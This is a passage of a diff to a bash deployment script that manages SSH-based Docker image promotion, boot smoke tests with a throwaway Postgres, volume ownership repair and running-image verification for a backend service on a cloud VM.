+     if sudo test -f \"\$f\" && sudo grep -q '^ACX_IMAGE_REPO=' \"\$f\" 2>/dev/null; then \
+       sudo sed -i '/^ACX_IMAGE_REPO=/d' \"\$f\"; \
+       echo 'removed ACX_IMAGE_REPO'; \
+     else \
+       echo 'ACX_IMAGE_REPO not present (already default)'; \
+     fi"
+  log "clear-image-repo done for ${env}. Restart the unit (or re-deploy) to pick up the recognition default."
 }
 
 # Converge the deployed compose file(s) + systemd unit + shared Caddy edge with
@@ -500,7 +910,7 @@ converge_runtime() {
   # so a plain scp to the final path fails with Permission denied.
   _ship_file() {
     local src="$1" dest="$2" name; name="$(basename "$dest")"
-    ssh "${SSH_TARGET}" "cat > '/tmp/${name}' && sudo cp '/tmp/${name}' '${dest}' && rm -f '/tmp/${name}'" < "$src"
+    ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cat > '/tmp/${name}' && sudo cp '/tmp/${name}' '${dest}' && rm -f '/tmp/${name}'" < "$src"
   }
 
   # ---- Edge probes + gate FIRST (before any remote mutation) --------------
@@ -520,11 +930,11 @@ converge_runtime() {
   # command itself exits 0 even when the file is missing (awk terminates the
   # pipe), so a nonzero rc here is ssh/transport, not "file absent".
   local edge_sum_rc=0
-  remote_caddy_sum="$(ssh "${SSH_TARGET}" "sha256sum '${edge_dir}/Caddyfile' 2>/dev/null | awk '{print \$1}'")" || edge_sum_rc=$?
+  remote_caddy_sum="$(ssh -l "${OCI_USER}" -- "${OCI_HOST}" "sha256sum '${edge_dir}/Caddyfile' 2>/dev/null | awk '{print \$1}'")" || edge_sum_rc=$?
   if (( edge_sum_rc != 0 )); then
     fail "cannot read remote edge checksums on ${SSH_TARGET} (ssh exit ${edge_sum_rc}); refusing to treat transport failure as edge drift"
   fi
-  remote_compose_sum="$(ssh "${SSH_TARGET}" "sha256sum '${edge_dir}/docker-compose.caddy.yml' 2>/dev/null | awk '{print \$1}'")" || edge_sum_rc=$?
+  remote_compose_sum="$(ssh -l "${OCI_USER}" -- "${OCI_HOST}" "sha256sum '${edge_dir}/docker-compose.caddy.yml' 2>/dev/null | awk '{print \$1}'")" || edge_sum_rc=$?
   if (( edge_sum_rc != 0 )); then
     fail "cannot read remote edge checksums on ${SSH_TARGET} (ssh exit ${edge_sum_rc}); refusing to treat transport failure as edge drift"
   fi
@@ -537,7 +947,7 @@ converge_runtime() {
   # fir.dev.api 502s (gate r0811864a G2-03). Inspect the live container and
   # escalate a missing membership to compose-level drift (recreate path).
   local edge_membership edge_member_rc=0
-  edge_membership="$(ssh "${SSH_TARGET}" "cd '${edge_dir}' && cid=\$(docker compose -f docker-compose.caddy.yml ps -q caddy 2>/dev/null); if [ -z \"\$cid\" ]; then echo NOCADDY; elif docker inspect -f '{{json .NetworkSettings.Networks}}' \"\$cid\" | grep -q '\"${fir_net}\"'; then echo MEMBER; else echo MISSING; fi")" || edge_member_rc=$?
+  edge_membership="$(ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cd '${edge_dir}' && cid=\$(docker compose -f docker-compose.caddy.yml ps -q caddy 2>/dev/null); if [ -z \"\$cid\" ]; then echo NOCADDY; elif docker inspect -f '{{json .NetworkSettings.Networks}}' \"\$cid\" | grep -q '\"${fir_net}\"'; then echo MEMBER; else echo MISSING; fi")" || edge_member_rc=$?
   if (( edge_member_rc != 0 )); then
     fail "cannot inspect caddy edge network membership on ${SSH_TARGET} (ssh exit ${edge_member_rc}); refusing to converge edge blind"
   fi
@@ -562,14 +972,15 @@ converge_runtime() {
   fi
 
   # ---- Env runtime mutation (only after gate decision) --------------------
-  ssh "${SSH_TARGET}" "cp -f '${remote_dir}/docker-compose.env.yml' '${remote_dir}/docker-compose.env.yml.bak' 2>/dev/null || true; sudo cp -f '/etc/systemd/system/${unit}.service' '/etc/systemd/system/${unit}.service.bak' 2>/dev/null || true"
+  ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cp -f '${remote_dir}/docker-compose.env.yml' '${remote_dir}/docker-compose.env.yml.bak' 2>/dev/null || true; sudo cp -f '/etc/systemd/system/${unit}.service' '/etc/systemd/system/${unit}.service.bak' 2>/dev/null || true"
   _ship_file "${SERVICE_DIR}/docker-compose.env.yml" "${remote_dir}/docker-compose.env.yml"
   if [[ "$env" == "prod" ]]; then
     # Back up the admin overlay too so a bad overlay is restorable from *.bak.
-    ssh "${SSH_TARGET}" "cp -f '${remote_dir}/docker-compose.admin.yml' '${remote_dir}/docker-compose.admin.yml.bak' 2>/dev/null || true"
+    ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cp -f '${remote_dir}/docker-compose.admin.yml' '${remote_dir}/docker-compose.admin.yml.bak' 2>/dev/null || true"
     _ship_file "${SERVICE_DIR}/docker-compose.admin.yml" "${remote_dir}/docker-compose.admin.yml"
   fi
-  render_unit "$env" | ssh "${SSH_TARGET}" "cat > '/tmp/${unit}.service' && sudo cp '/tmp/${unit}.service' '/etc/systemd/system/${unit}.service' && rm -f '/tmp/${unit}.service' && sudo systemctl daemon-reload"
+  # ACX_IMAGE_REPO is shipped once in promote_gate (S2-A-06) — not re-written here.
+  render_unit "$env" | ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cat > '/tmp/${unit}.service' && sudo cp '/tmp/${unit}.service' '/etc/systemd/system/${unit}.service' && rm -f '/tmp/${unit}.service' && sudo systemctl daemon-reload"
 
   # ---- Edge mutation (only when gated in) ---------------------------------
   if (( edge_apply_edge == 0 )); then
@@ -582,7 +993,7 @@ converge_runtime() {
     return 0
   fi
 
-  ssh "${SSH_TARGET}" "cp -f '${edge_dir}/Caddyfile' '${edge_dir}/Caddyfile.bak' 2>/dev/null || true; cp -f '${edge_dir}/docker-compose.caddy.yml' '${edge_dir}/docker-compose.caddy.yml.bak' 2>/dev/null || true"
+  ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cp -f '${edge_dir}/Caddyfile' '${edge_dir}/Caddyfile.bak' 2>/dev/null || true; cp -f '${edge_dir}/docker-compose.caddy.yml' '${edge_dir}/docker-compose.caddy.yml.bak' 2>/dev/null || true"
   if (( edge_caddy_drift )); then
     _ship_file "${SERVICE_DIR}/Caddyfile" "${edge_dir}/Caddyfile"
   fi
@@ -600,7 +1011,7 @@ converge_runtime() {
     edge_apply="docker compose -f docker-compose.caddy.yml exec -T caddy caddy reload --config /etc/caddy/Caddyfile || docker compose -f docker-compose.caddy.yml up -d"
   fi
   # Expand locals into the remote script (fir_net / edge_apply).
-  ssh "${SSH_TARGET}" "bash -s" <<EDGE
+  ssh -l "${OCI_USER}" -- "${OCI_HOST}" "bash -s" <<EDGE
 set -euo pipefail
 cd /opt/acx-backend
 # FL30C-GATE-01: acx-dev-fir-net is external on the shared compose; create it
@@ -648,7 +1059,7 @@ converge_check() {
     # content/missing-file mismatch. Aborts on ssh transport failure.
     local remote_path="$1" local_path="$2" label="$3"
     ssh_rc=0
-    ssh "${SSH_TARGET}" "cat '${remote_path}'" >"${remote_tmp}" 2>/dev/null || ssh_rc=$?
+    ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cat '${remote_path}'" >"${remote_tmp}" 2>/dev/null || ssh_rc=$?
     if (( ssh_rc == 255 )); then
       _cc_fail "cannot read remote ${label} on ${SSH_TARGET} (ssh exit ${ssh_rc}); refusing to treat transport failure as runtime drift"
     fi
@@ -675,7 +1086,7 @@ converge_check() {
   fi
   rendered="$(render_unit "$env")"
   ssh_rc=0
-  ssh "${SSH_TARGET}" "cat '/etc/systemd/system/${unit}.service'" >"${remote_tmp}" 2>/dev/null || ssh_rc=$?
+  ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cat '/etc/systemd/system/${unit}.service'" >"${remote_tmp}" 2>/dev/null || ssh_rc=$?
   if (( ssh_rc == 255 )); then
     _cc_fail "cannot read remote ${unit}.service on ${SSH_TARGET} (ssh exit ${ssh_rc}); refusing to treat transport failure as runtime drift"
   elif (( ssh_rc != 0 )); then
@@ -701,7 +1112,7 @@ converge_check() {
   # converge_runtime's MEMBER|MISSING|NOCADDY inspect so --check catches the
   # fir-502 case (caddy never recreated onto acx-dev-fir-net).
   local edge_membership edge_member_rc=0
-  edge_membership="$(ssh "${SSH_TARGET}" "cd '${edge_dir}' && cid=\$(docker compose -f docker-compose.caddy.yml ps -q caddy 2>/dev/null); if [ -z \"\$cid\" ]; then echo NOCADDY; elif docker inspect -f '{{json .NetworkSettings.Networks}}' \"\$cid\" | grep -q '\"${fir_net}\"'; then echo MEMBER; else echo MISSING; fi")" || edge_member_rc=$?
+  edge_membership="$(ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cd '${edge_dir}' && cid=\$(docker compose -f docker-compose.caddy.yml ps -q caddy 2>/dev/null); if [ -z \"\$cid\" ]; then echo NOCADDY; elif docker inspect -f '{{json .NetworkSettings.Networks}}' \"\$cid\" | grep -q '\"${fir_net}\"'; then echo MEMBER; else echo MISSING; fi")" || edge_member_rc=$?
   if (( edge_member_rc != 0 )); then
     _cc_fail "cannot inspect caddy edge network membership on ${SSH_TARGET} (ssh exit ${edge_member_rc}); refusing to treat transport failure as runtime drift"
   fi
@@ -722,9 +1133,9 @@ preserve_rollback_tag() {
   env_tag="$(env_to_tag "$env")"
   # `|| true`: a missing image makes the pipeline exit non-zero; without this,
   # set -e would abort the whole deploy on a first deploy / pruned image.
-  prev_id="$(ssh "${SSH_TARGET}" "docker image inspect --format '{{.Id}}' ${IMAGE_BASE}:${env_tag} 2>/dev/null" | sed 's/^sha256://' | cut -c1-12)" || true
+  prev_id="$(ssh -l "${OCI_USER}" -- "${OCI_HOST}" "docker image inspect --format '{{.Id}}' ${IMAGE_BASE}:${env_tag} 2>/dev/null" | sed 's/^sha256://' | cut -c1-12)" || true
   if [[ -n "${prev_id}" ]]; then
-    if ssh "${SSH_TARGET}" "docker tag ${IMAGE_BASE}:${env_tag} ${IMAGE_BASE}:rollback-${prev_id}"; then
+    if ssh -l "${OCI_USER}" -- "${OCI_HOST}" "docker tag ${IMAGE_BASE}:${env_tag} ${IMAGE_BASE}:rollback-${prev_id}"; then
       log "Preserved rollback tag ${IMAGE_BASE}:rollback-${prev_id}"
     else
       warn "could not create rollback tag for ${env} (continuing)"
@@ -735,35 +1146,54 @@ preserve_rollback_tag() {
 }
 
 # Pre-promote boot smoke: boot the freshly-built :SHA in a throwaway container on
-# the VM *before* :latest is restarted, so a bad image (missing package, import
-# error, failed boot) aborts the deploy with prod still serving the old image.
-# Returns non-zero on any smoke failure. Two gates: (1) a network-free import
-# smoke that catches ModuleNotFoundError-class packaging omissions; (2) a
-# short-lived full-boot /health probe on an ephemeral port against the env net.
+# the VM *before* :latest is promoted/restarted, so a bad image (missing package,
+# import error, failed real boot chain) aborts the deploy with prod still serving
+# the old image. Returns non-zero on any smoke failure.
+# Two gates: (1) network-free import smoke; (2) full image CMD (docker-entrypoint.sh)
+# with the same /data/cache + RECOGNITION_BLOB_ROOT mounts the deployed stack uses,
+# so smoke observes entrypoint + /app/.image-variant + VLM cache gates (D4).
 do_boot_smoke() {
-  local env="$1" image="$2" remote_dir
+  local env="$1" image="$2" remote_dir smoke_timeout poll_interval attempts
   remote_dir="$(env_to_remote_dir "$env")"
-  log "Pre-promote boot smoke: ${image} on ${SSH_TARGET} (env=${env})"
+  assert_safe_image_repo "smoke image repo" "${image%%:*}"
+  # Image-aware budget: recognition default 24s; VLM uses the unmeasured longer
+  # default. ACX_SMOKE_TIMEOUT overrides either, validated as a positive integer.
+  smoke_timeout="$(resolve_smoke_timeout)"
+  poll_interval=2
+  attempts=$(( (smoke_timeout + poll_interval - 1) / poll_interval ))
+  log "Pre-promote boot smoke: ${image} on ${SSH_TARGET} (env=${env}, health_budget=${smoke_timeout}s, real entrypoint)"
+  # S2-A-09: VLM/local-build path still pulls layers onto the VM here — consult
+  # free-space floor before docker pull (same OPS-1 guard as remote build).
+  assert_remote_disk_headroom_for_pull
   # Gate 1 — network-free import smoke. Catches the ModuleNotFoundError-class
   # packaging omissions (the scene/ incident) without touching the DB.
   # RECOGNITION_RUNTIME_MODE=development so the production load-time secret
   # fail-fast (validate_required_secrets / validate_oci_vault_boot) no-ops — this
   # gate proves the image IMPORTS, not that prod secrets are configured (that is
-  # Gate 2, which uses the deployed .env).
-  if ! ssh "${SSH_TARGET}" "docker pull ${image} >/dev/null && docker run --rm -e RECOGNITION_RUNTIME_MODE=development --entrypoint python ${image} -c 'import api.main'"; then
+  # Gate 2, which uses the deployed .env + real entrypoint).
+  if ! ssh -l "${OCI_USER}" -- "${OCI_HOST}" "docker pull ${image} >/dev/null && docker run --rm -e RECOGNITION_RUNTIME_MODE=development --entrypoint python ${image} -c 'import api.main'"; then
     warn "boot smoke: 'import api.main' failed on ${image} (packaging/import error)"
     return 1
   fi
-  # Gate 2 — full-boot /health probe in a throwaway container. The entrypoint is
-  # overridden to run uvicorn ONLY (skipping the image's migrate + verify boot
-  # steps), so the smoke never mutates the live prod schema — it proves the app
-  # boots and /health answers, then is torn down. Network name is read (not
-  # sourced) from the deployed .env so a docker-only env line cannot abort it.
-  if ! ssh "${SSH_TARGET}" "bash -s ${env} ${image} ${remote_dir}" <<'SMOKE'
+  # Gate 2 — real image CMD (scripts/docker-entrypoint.sh): migrate + schema verify
+  # + optional VLM cache verify + uvicorn. Mounts match docker-compose.env.yml:
+  #   ACX_MODELS_PATH → /data/cache:ro
+  #   RECOGNITION_BLOB_ROOT=/var/lib/acx-blobs (ephemeral volume for smoke)
+  # Network name is read (not sourced) from the deployed .env.
+  # DB target is an ephemeral Postgres started for this smoke only — never the
+  # env-file / Vault prod DSN (H2 / INT-01). Real entrypoint stays (D4).
+  # Budget is ACX_SMOKE_TIMEOUT (default 24s recognition / longer unvalidated VLM).
+  local vlm_budget=0
+  if is_vlm_smoke_budget && [[ -z "${ACX_SMOKE_TIMEOUT:-}" ]]; then
+    vlm_budget=1
+  fi
+  if ! ssh -l "${OCI_USER}" -- "${OCI_HOST}" "bash -s ${env} ${image} ${remote_dir} ${smoke_timeout} ${poll_interval} ${attempts} ${vlm_budget}" <<'SMOKE'
 set -euo pipefail
-env="$1"; image="$2"; remote_dir="$3"
-net="$(grep -E '^ACX_NETWORK_NAME=' "${remote_dir}/.env" 2>/dev/null | tail -1 | cut -d= -f2- | tr -d "\"' " || true)"
+env="$1"; image="$2"; remote_dir="$3"; budget_s="$4"; poll_s="$5"; attempts="$6"; vlm_budget="$7"
+env_file="${remote_dir}/.env"
+net="$(grep -E '^ACX_NETWORK_NAME=' "${env_file}" 2>/dev/null | tail -1 | cut -d= -f2- | tr -d "\"' " || true)"
 net="${net:-acx-${env}-net}"
+models_path="$(grep -E '^ACX_MODELS_PATH=' "${env_file}" 2>/dev/null | tail -1 | cut -d= -f2- | tr -d "\"'" || true)"
 # First-ever deploy of an env runs this smoke BEFORE converge_runtime's net
 # auto-create, so the env net may not exist yet (gate r0811864a A-01). Create
 # it idempotently with compose-parity labels so the later `compose up` adopts
@@ -775,22 +1205,114 @@ if ! docker network inspect "$net" >/dev/null 2>&1; then
     "$net"
 fi
 name="acx-smoke-${env}-$$"
-docker run -d --rm --name "$name" --env-file "${remote_dir}/.env" --network "$net" -P \
-  --entrypoint sh "$image" -c 'cd /app && exec uvicorn api.main:app --host 0.0.0.0 --port 8000' >/dev/null
-trap 'docker rm -f "$name" >/dev/null 2>&1 || true' EXIT
-port="$(docker port "$name" 8000/tcp | head -1 | sed 's/.*://')"
-for _ in $(seq 1 12); do
-  if curl -fsS "http://127.0.0.1:${port}/health" >/dev/null 2>&1; then echo "smoke health OK"; exit 0; fi
-  sleep 2
+blob_vol="acx-smoke-blobs-${env}-$$"
+pg_name="acx-smoke-pg-${env}-$$"
+smoke_user="acx_smoke"
+smoke_pass="acx_smoke_not_prod"
+smoke_db="acx_smoke"
+# Throwaway DSNs — host is the ephemeral container name on the smoke network.
+smoke_async_dsn="postgresql+asyncpg://${smoke_user}:${smoke_pass}@${pg_name}:5432/${smoke_db}"
+smoke_sync_dsn="postgresql+psycopg://${smoke_user}:${smoke_pass}@${pg_name}:5432/${smoke_db}"
+# Inline trap (no nested function) so structural parsers that stop at first \n}\n
+# still capture the full do_boot_smoke body.
+trap 'docker rm -f "$name" >/dev/null 2>&1 || true; docker rm -f "$pg_name" >/dev/null 2>&1 || true; docker volume rm -f "$blob_vol" >/dev/null 2>&1 || true' EXIT
+# Ephemeral Postgres so entrypoint migrate/schema-verify never touch live env DB.
+docker run -d --rm --name "$pg_name" --network "$net" \
+  -e POSTGRES_USER="$smoke_user" \
+  -e POSTGRES_PASSWORD="$smoke_pass" \
+  -e POSTGRES_DB="$smoke_db" \
+  pgvector/pgvector:pg17 >/dev/null
+pg_ready=0
+for _ in $(seq 1 30); do
+  if docker exec "$pg_name" pg_isready -U "$smoke_user" -d "$smoke_db" >/dev/null 2>&1; then
+    pg_ready=1
+    break
+  fi
+  sleep 1
 done
-echo "smoke health FAILED after 24s" >&2
+if [[ "$pg_ready" != "1" ]]; then
+  echo "smoke ephemeral postgres failed to become ready" >&2
+  exit 1
+fi
+# Real image CMD — do not override entrypoint; must exercise docker-entrypoint.sh
+# (and /app/.image-variant fail-closed checks owned by sibling lane).
+# -e overrides beat --env-file; force env secret backend so oci_vault cannot
+# inject the live prod POSTGRES_DSN after env-file is loaded.
+# tmpfs matches compose HF_MODULES_CACHE mount (HARM-A-02): noexec + uid 10001
+# so smoke exercises the deployed module-scratch topology, not the image layer dir.
+# S2-A-08: compose hard-fails without ACX_MODELS_PATH (no default on the :ro
+# cache bind). Smoke must not go green on an .env the real stack cannot start under.
+if [[ -z "${models_path}" ]]; then
+  echo "smoke requires ACX_MODELS_PATH in ${env_file} (compose would fail without it)" >&2
+  exit 1
+fi
+run_args=( -d --rm --name "$name" --env-file "${env_file}" --network "$net" -P
+  -e RECOGNITION_BLOB_ROOT=/var/lib/acx-blobs
+  -e RECOGNITION_SECRET_BACKEND=env
+  -e POSTGRES_DSN="${smoke_async_dsn}"
+  -e POSTGRES_SYNC_DSN="${smoke_sync_dsn}"
+  -e PGHOST="${pg_name}"
+  -e PGPORT=5432
+  -e PGUSER="${smoke_user}"
+  -e PGPASSWORD="${smoke_pass}"
+  -e DB_NAME="${smoke_db}"
+  -e RECOGNITION_ADMIN_TOKEN=acx-smoke-admin-token-not-for-prod-use
+  -v "${blob_vol}:/var/lib/acx-blobs"
+  -v "${models_path}:/data/cache:ro"
+  --tmpfs /var/cache/acx/hf_modules:mode=0700,uid=10001,gid=10001,size=32m,noexec )
+docker run "${run_args[@]}" "$image" >/dev/null
+port="$(docker port "$name" 8000/tcp | head -1 | sed 's/.*://')"
+for _ in $(seq 1 "${attempts}"); do
+  if curl -fsS "http://127.0.0.1:${port}/health" >/dev/null 2>&1; then echo "smoke health OK"; exit 0; fi
+  sleep "${poll_s}"
+done
+if [[ "${vlm_budget}" == "1" ]]; then
+  echo "smoke health FAILED after ${budget_s}s (VLM budget is an UNVALIDATED default — raise via ACX_SMOKE_TIMEOUT once a real arm64 VLM smoke is measured)" >&2
+else
+  echo "smoke health FAILED after ${budget_s}s" >&2
+fi
 exit 1
 SMOKE
   then
-    warn "boot smoke: /health never came up for ${image}"
+    if [[ "${vlm_budget}" == "1" ]]; then
+      warn "boot smoke: /health never came up for ${image} after ${smoke_timeout}s (VLM budget is an UNVALIDATED default — set ACX_SMOKE_TIMEOUT=<seconds> to raise it)"
+    else
+      warn "boot smoke: /health never came up for ${image} after ${smoke_timeout}s"
+    fi
     return 1
   fi
   log "Boot smoke passed for ${image}"
+}
+
+# One-shot acx_blobs ownership repair for volumes created under root before USER acx
+# (ORCH-LAUNCH-01-REV-r0811af90-S1-A-02). Docker only propagates image-path ownership
+# when initialising an empty new volume — existing root:root named volumes stay root
+# forever and every multipart upload 500s with EACCES. Compose defines a
+# profiles:[repair] fix-blob-ownership service.
+# W8-VER-03: probe volume-root ownership first; skip the O(blobs) recursive chown
+# when the root is already acx-owned (migration is one-shot after the first repair).
+repair_blob_volume_ownership() {
+  local env="$1"
+  local remote_dir compose_files
+  remote_dir="$(env_to_remote_dir "$env")"
+  compose_files="$(env_to_compose_files "$env")"
+  log "Repairing acx_blobs ownership on ${env} (probe-then-chown; fix-blob-ownership profile)"
+  # shellcheck disable=SC2086 # compose_files is intentionally word-split (-f a -f b).
+  # Probe runs as root via the repair profile image; uid 10001 is the Dockerfile acx user.
+  if ! ssh -l "${OCI_USER}" -- "${OCI_HOST}" \
+    "cd '${remote_dir}' && docker compose ${compose_files} --profile repair run --rm --entrypoint sh fix-blob-ownership -c '
+      root=/var/lib/acx-blobs
+      uid=\$(stat -c %u \"\$root\" 2>/dev/null || echo unknown)
+      if [ \"\$uid\" = \"10001\" ]; then
+        echo \"acx_blobs root already uid=10001; skip recursive chown\"
+        exit 0
+      fi
+      echo \"acx_blobs root uid=\$uid; running recursive chown acx:acx\"
+      chown -R acx:acx \"\$root\"
+    '"; then
+    warn "acx_blobs ownership repair failed on ${env}; multipart uploads will EACCES under USER acx. Run: cd ${remote_dir} && docker compose ${compose_files} --profile repair run --rm fix-blob-ownership"
+    return 1
+  fi
 }
 
 do_restart() {
@@ -799,8 +1321,25 @@ do_restart() {
   remote_dir="$(env_to_remote_dir "$env")"
   unit="$(env_to_unit "$env")"
   compose_files="$(env_to_compose_files "$env")"
-  log "Pulling latest image + restarting ${unit} on ${SSH_TARGET}"
-  ssh "${SSH_TARGET}" "cd ${remote_dir} && docker compose ${compose_files} pull api && sudo systemctl restart ${unit}"
+  # ACX_IMAGE_REPO is shipped once in promote_gate (S2-A-06), including the
+  # ACX_CONVERGE_RUNTIME=0 image-only path — do not rewrite .env again here.
+  # A-11: pull materialises layers on the VM — free-space floor for VLM.
+  assert_remote_disk_headroom_for_pull
+  # Pull first so the repair service image matches the about-to-restart stack.
+  log "Pulling ${ACX_IMAGE_REPO} on ${SSH_TARGET}"
+  # shellcheck disable=SC2086
+  if ! ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cd ${remote_dir} && docker compose ${compose_files} pull api"; then
+    warn "compose pull api failed on ${env}"
+    return 1
+  fi
+  if ! repair_blob_volume_ownership "$env"; then
+    return 1
+  fi
+  log "Restarting ${unit} on ${SSH_TARGET}"
+  if ! ssh -l "${OCI_USER}" -- "${OCI_HOST}" "sudo systemctl restart ${unit}"; then
+    warn "systemctl restart ${unit} failed"
+    return 1
+  fi
 }
 
 #---------------------------------------------------------------- deploy
@@ -841,13 +1380,22 @@ do_deploy() {
   # (e.g. :latest) so a failed smoke never poisons the promotion tag in OCIR.
   do_push_sha
   promote_gate "$env" "${IMAGE_BASE}:${sha}"
-  do_push_tag "$tag"
+  # S2-A-06: if tag promotion fails after ship, restore prior sticky repo.
+  if ! do_push_tag "$tag"; then
+    restore_prior_image_repo_env
+    fail "Push of env tag failed after shipping ACX_IMAGE_REPO; prior sticky repo restored where possible."
+  fi
 
-  do_restart "$env"
+  if ! do_restart "$env"; then
+    restore_prior_image_repo_env
+    fail "Restart failed after shipping ACX_IMAGE_REPO; prior sticky repo restored where possible."
+  fi
 
   log "Deploy submitted. Verifying..."
   sleep 5
-  if ! do_verify "$env"; then
+  # S2-A-04: deploy path uses local resolve as authority (not the remote .env
+  # we just wrote — that comparison would be tautological).
+  if ! ACX_VERIFY_EXPECT_LOCAL=1 do_verify "$env"; then
     if [[ "${ACX_VERIFY_OPTIONAL:-0}" == "1" ]]; then
       warn "Verify failed but ACX_VERIFY_OPTIONAL=1; not failing the deploy."
     else
@@ -886,8 +1434,10 @@ do_promote() {
     log "Mode: remote-retag (${SSH_TARGET})"
     preflight_remote_docker
     preflight_remote_ocir_auth
+    # A-11: promote remote branch materialises layers — same free-space floor.
+    assert_remote_disk_headroom_for_pull
     log "Pulling source image ${IMAGE_BASE}:${from_tag} on ${SSH_TARGET}"
-    ssh "${SSH_TARGET}" "docker pull ${IMAGE_BASE}:${from_tag}"
+    ssh -l "${OCI_USER}" -- "${OCI_HOST}" "docker pull ${IMAGE_BASE}:${from_tag}"
   else
     preflight_docker
     preflight_ocir_auth
@@ -901,18 +1451,27 @@ do_promote() {
 
   if [[ "${REMOTE_BUILD}" == "1" ]]; then
     log "Tagging ${from_tag} -> ${to_tag} on ${SSH_TARGET}"
-    ssh "${SSH_TARGET}" "docker tag ${IMAGE_BASE}:${from_tag} ${IMAGE_BASE}:${to_tag} && docker push ${IMAGE_BASE}:${to_tag}"
+    if ! ssh -l "${OCI_USER}" -- "${OCI_HOST}" "docker tag ${IMAGE_BASE}:${from_tag} ${IMAGE_BASE}:${to_tag} && docker push ${IMAGE_BASE}:${to_tag}"; then
+      restore_prior_image_repo_env
+      fail "Remote tag/push failed after shipping ACX_IMAGE_REPO; prior sticky repo restored where possible."
+    fi
   else
     log "Tagging ${from_tag} -> ${to_tag}"
-    docker tag "${IMAGE_BASE}:${from_tag}" "${IMAGE_BASE}:${to_tag}"
-    docker push "${IMAGE_BASE}:${to_tag}"
+    if ! docker tag "${IMAGE_BASE}:${from_tag}" "${IMAGE_BASE}:${to_tag}" \
+      || ! docker push "${IMAGE_BASE}:${to_tag}"; then
+      restore_prior_image_repo_env
+      fail "Tag/push failed after shipping ACX_IMAGE_REPO; prior sticky repo restored where possible."
+    fi
   fi
 
-  do_restart "$to_env"
+  if ! do_restart "$to_env"; then
+    restore_prior_image_repo_env
+    fail "Restart failed after shipping ACX_IMAGE_REPO; prior sticky repo restored where possible."
+  fi
 
   log "Promotion submitted. Verifying..."
   sleep 5
-  if ! do_verify "$to_env"; then
+  if ! ACX_VERIFY_EXPECT_LOCAL=1 do_verify "$to_env"; then
     if [[ "${ACX_VERIFY_OPTIONAL:-0}" == "1" ]]; then
       warn "Verify failed but ACX_VERIFY_OPTIONAL=1; not failing the promotion."
     else
@@ -922,9 +1481,114 @@ do_promote() {
 }
 
 #---------------------------------------------------------------- verify
+# Read the running api container's Config.Image from the remote host (rg-015).
+# Returns the raw reference on stdout; empty on inspect failure.
+read_running_api_image() {
+  local env="$1" remote_dir compose_files
+  remote_dir="$(env_to_remote_dir "$env")"
+  compose_files="$(env_to_compose_files "$env")"
+  # shellcheck disable=SC2086 # compose_files is intentionally word-split (-f a -f b).
+  ssh -o BatchMode=yes -o ConnectTimeout=10 -l "${OCI_USER}" -- "${OCI_HOST}" \
+    "cd '${remote_dir}' && cid=\$(docker compose ${compose_files} ps -q api 2>/dev/null | head -1) && \
+     [ -n \"\$cid\" ] && docker inspect --format '{{.Config.Image}}' \"\$cid\"" 2>/dev/null || true
+}
+
+# Read remote .env ACX_IMAGE_REPO (empty if unset). Charset-validated when present.
+# S2-A-05: never call fail() inside this function when used from command
+# substitution — fail() would only kill the subshell and the caller’s `|| true`
+# would swallow it. On validation failure print sentinel __INVALID_REPO__ and
+# return 2 so callers fail closed.
+# D10: standalone `verify` against a VLM deploy must use the shipped sticky repo,
+# not the local default recognition resolve, so operators need not re-export
+# ACX_BUILD_TARGET=runtime-vlm just to verify.
+read_remote_image_repo() {
+  local env="$1" remote_dir raw
+  remote_dir="$(env_to_remote_dir "$env")"
+  raw="$(ssh -o BatchMode=yes -o ConnectTimeout=10 -l "${OCI_USER}" -- "${OCI_HOST}" \
+    "f='${remote_dir}/.env'; \
+     if sudo test -f \"\$f\" 2>/dev/null; then sudo grep -E '^ACX_IMAGE_REPO=' \"\$f\" 2>/dev/null | tail -1 | cut -d= -f2-; \
+     elif test -f \"\$f\"; then grep -E '^ACX_IMAGE_REPO=' \"\$f\" 2>/dev/null | tail -1 | cut -d= -f2-; fi" \
+    2>/dev/null | tr -d "\"' \r" || true)"
+  if [[ -n "${raw}" ]]; then
+    if [[ ! "${raw}" =~ ^[A-Za-z0-9_.:/-]+$ ]]; then
+      printf '%s\n' "__INVALID_REPO__"
+      return 2
+    fi
+    printf '%s\n' "${raw}"
+  fi
+}
+
+# Expected image_variant label for the current local resolve (HARM-A-04).
+# recognition when empty; vlm when ACX_BUILD_TARGET matches *vlm* or variant=vlm.
+expected_image_variant() {
+  if is_vlm_smoke_budget; then
+    printf '%s\n' "vlm"
+  else
+    printf '%s\n' "recognition"
+  fi
+}
+
+# Derive variant from an image repository path (*-vlm → vlm).
+variant_from_image_repo() {
+  local repo="$1"
+  case "${repo}" in
+    *-vlm) printf '%s\n' "vlm" ;;
+    *)     printf '%s\n' "recognition" ;;
+  esac
+}
+
+# Compare live container image repo to expected (return 1 on mismatch — never
+# call fail/exit here so `if ! do_verify` and ACX_VERIFY_OPTIONAL=1 work — D10).
+# S2-A-04: local resolve is authoritative when the operator set a variant selector
+# OR when ACX_VERIFY_EXPECT_LOCAL=1 (deploy/promote path). Remote .env is only
+# consulted for bare standalone `verify` so VLM recovery works without re-export.
+verify_running_image_matches_deployed() {
+  local env="$1" env_tag expected_repo expected_ref running_image remote_repo source_note
+  env_tag="$(env_to_tag "$env")"
+  remote_repo="$(read_remote_image_repo "$env" || true)"
+  if [[ "${remote_repo}" == "__INVALID_REPO__" ]]; then
+    warn "IMAGE VERIFY: remote ACX_IMAGE_REPO on ${env} failed charset validation (fail-closed)"
+    return 1
+  fi
+  if [[ "${ACX_VERIFY_EXPECT_LOCAL:-0}" == "1" \
+     || -n "${ACX_BUILD_TARGET:-}" \
+     || -n "${ACX_IMAGE_VARIANT:-}" ]]; then
+    expected_repo="${ACX_IMAGE_REPO}"
+    source_note="local resolve"
+  elif [[ -n "${remote_repo}" ]]; then
+    expected_repo="${remote_repo}"
+    source_note="remote .env"
+  else
+    expected_repo="${ACX_IMAGE_REPO}"
+    source_note="local resolve (no remote key)"
+  fi
+  if [[ ! "${expected_repo}" =~ ^[A-Za-z0-9_.:/-]+$ ]]; then
+    warn "IMAGE VERIFY: expected image repo failed charset validation: ${expected_repo}"
+    return 1
+  fi
